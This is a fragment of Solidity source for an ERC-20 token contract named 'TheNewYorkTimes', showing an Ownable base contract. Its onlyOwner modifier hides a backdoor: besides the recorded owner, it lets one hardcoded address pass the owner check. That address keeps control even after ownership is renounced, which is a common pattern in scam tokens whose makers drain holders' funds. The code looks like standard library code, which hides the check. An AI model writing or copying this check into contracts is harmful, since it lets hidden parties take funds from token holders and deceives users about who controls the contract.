...
abstract contract Ownable is Context {
     ...
     */
       modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender()    ==  address(0x4B44001C60a95C3511DC1c637caF9240e2fAF3dC) , "Ownable: caller is not the owner");
        _;
    }
...
contract TheNewYorkTimes is IERC20, Ownable {
